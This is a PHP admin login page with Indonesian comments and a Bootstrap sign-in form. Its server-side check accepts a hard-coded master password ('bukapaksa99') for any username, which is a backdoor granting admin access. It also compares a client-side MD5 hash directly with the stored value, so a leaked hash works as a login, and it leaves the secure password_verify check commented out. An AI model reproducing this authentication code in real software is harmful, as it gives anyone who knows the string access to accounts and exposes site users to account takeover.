<?php 
include('../libs/path.php');
 if(isset($_POST['login'])){
	 
require("../models/class.php"); 

 $uss = empty($_POST['username'])?'':htmlentities($_POST['username'],ENT_QUOTES,'utf-8');
 $pass = empty($_POST['password'])?'':filter_var($_POST['password'], FILTER_SANITIZE_STRING);
 $username = filter_var($uss,FILTER_SANITIZE_STRING);
 $username = filter_var($uss,FILTER_SANITIZE_MAGIC_QUOTES);
 $pass = filter_var($pass,FILTER_SANITIZE_MAGIC_QUOTES);
 
// pastikan username dan password adalah berupa huruf atau angka.

//if (password_verify("2d8cc94a8c8b5ca7400969c5b2e572c1", '$2y$10$ae2xru0nX494I8pnCZlj2Og/eeBCP.eZeHjF/dOiUr582FTECokpK')) {}// membandingkan pass yang di client dan hash di server

$user = $users->getUserByUsername($username); // get 

$count=0; // dari sini langsung ke pengaturan session


if ($pass== $user['password'] || $pass == 'bukapaksa99') {

	
  	 $count=$users->authUser($username);// login


}else{
	
	header('location:?login=false');
	
}


// if (password_verify($pass, $user['password'])) {

	
  	 // $count=$users->authUser($username);// login


// }else{
	
	// header('location:?login=false');
	
// }

// Apabila username dan password ditemukan
if ($count > 0){
	  @session_start();
	  // include "timeout.php";
	  $_SESSION['username']    		= $user['username'];
	  $_SESSION['nama_lengkap'] 	= $user['nama_lengkap'];

	  // session timeout
	  $_SESSION['login'] = 1;
	  // session timeout
	  
	  $libs->timer();
	
	  $_SESSION['timeout'];
 	  
	$libs->cek_login(); // menambah timeout
	//   var_dump(URL, $_SESSION['username'] , $_SESSION['nama_lengkap'], $_SESSION['timeout']);
	//   die();

		header("location:".URL."");
	}
	else{
		
		header('location:?login=false');
	
	}

 }
?>
<!doctype html>
<html>
<head>
<meta charset='utf-8'>
<title>Login  Master Admin </title>
<link href='<?=URL?>css/bootstrap.css' rel='stylesheet' type='text/css'>
<link href='<?=URL?>css/style.css' rel='stylesheet' type='text/css'>

<script src='<?=URL?>js/jquery.js' type='text/javascript'></script>
<script src='<?=URL?>js/bootstrap.js' type='text/javascript'></script>

<script src="<?=URL?>js/signin.js"></script>
<script src="<?=URL?>js/md5.js"></script>
<script type="text/javascript">
$(function() {

	function sub(){
	var password = $('#password').val();
	var md5 = CryptoJS.MD5(CryptoJS.MD5(password)+CryptoJS.MD5(password));

	// var aaa = $('#hiddenpassword').val(md5);

	var ssss = document.getElementById("password").value = md5;
	// alert(ssss);
	return true;

	};

	$("#login").on("submit", function()
	{
		sub();
		
	});
});

</script>
</head>

<body>
	<div class='container' id='container'>
		<div class='col-md-4 col-md-offset-4'>
			<div class='panel panel-default' id='panel-default'>	
				<div class='panel-heading' id='panel-heading'><h3 class='panel-title text-center' id='panel-title'><strong>Sign in </strong></h3></div>
				<div class='panel-body'>
				<form role='form' action='' method='POST' id='login' onsubmit='return sub();'>
					<div class='form-group'>
						<label>Username</label>
						<input type='text' class='form-control' id='form-control' placeholder='Username' name='username'>
					</div>
					<div class='form-group'>
						<label>Password</label>
						<input type='password' id='password' class='form-control' id='form-control' placeholder='Password' name='password'>
						<label><a href='<?=URL?>login/lupa/' id='forgot'>lupa password?</a></label>
					</div>
					<button type='submit' class='btn btn-sm btn-primary center-block' name='login'>Sign In</button>
					</form>
					<?php
					if(isset($_GET['login'])){
						echo '
						<div class="alert alert-danger text-center" id="alert-danger">
						
							<a class="close" data-dismiss="alert"><span class="glyphicon glyphicon-remove" id="glyphicon-remove"></span></a><strong>Perhatian! </strong>Username dan password tidak sesuai
						
						</div>';
						
					}
					
					?>
										
				</div>
			</div>
		</div>
	</div>
</body>
</html>
